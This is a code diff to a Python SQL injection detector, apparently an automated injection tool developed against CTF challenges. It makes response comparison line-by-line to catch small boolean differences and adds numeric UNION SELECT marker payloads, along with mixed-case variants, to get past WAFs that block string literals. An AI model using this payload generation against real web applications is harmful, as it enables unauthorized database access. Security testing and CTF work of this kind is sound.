@@ -338,7 +338,21 @@ class Detector:
 
     @staticmethod
     def _differs(a: ResponseInfo, b: ResponseInfo) -> bool:
-        return similarity(a, b) < 0.995 or a.status_code != b.status_code
+        """两响应是否可分。长页面里的细小差异（登录框只差一行文案）会被
+        quick_ratio 的 0.995 阈值吃掉 → 先用「逐行差异」补一刀：
+        行数或任一非空行不同即视为可分（ctf2 #47 Ezsql 实测：
+        5.8KB 页面只差"登录成功"/"密码错误"，相似度 0.998 被误判无差异）。"""
+        if a.status_code != b.status_code:
+            return True
+        if a.body == b.body:
+            return False
+        la, lb = a.body.splitlines(), b.body.splitlines()
+        if len(la) != len(lb):
+            return True
+        for x, y in zip(la, lb):
+            if x != y and (x.strip() or y.strip()):
+                return True
+        return similarity(a, b) < 0.995
 
     # ------------------------------------------------------------------ comment
     def _form_cores(self, inj: InjectionPoint):
@@ -444,15 +458,21 @@ class Detector:
         pre = f"0{inj.closure}" if not inj.numeric else "0"
         if not inj.closure:
             pre += form_sep(inj.form) if inj.form != "classic" else " "
-        for literal in ("quote", "hex", "mixed"):
+        for literal in ("digit", "quote", "hex", "mixed"):
             for n in range(1, 16):
                 if self.s.stopped:
                     return
-                markers = self._echo_markers(n)
-                if literal == "quote":
-                    cols = ",".join(f"'{m}'" for m in markers)
+                if literal == "digit":
+                    # 纯数字 marker：字符串/hex 全被 WAF 拦时的唯一通路
+                    # （ctf2 #47 Ezsql 实测：'asqaaa' 被拦，1,2,3 可用）
+                    markers = [str(9137 + i * 13) for i in range(n)]
+                    cols = ",".join(markers)
                 else:
-                    cols = ",".join(to_hex_literal(m) for m in markers)
+                    markers = self._echo_markers(n)
+                    if literal == "quote":
+                        cols = ",".join(f"'{m}'" for m in markers)
+                    else:
+                        cols = ",".join(to_hex_literal(m) for m in markers)
                 payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
                 if literal == "mixed":
                     payload = mixed_case(payload)
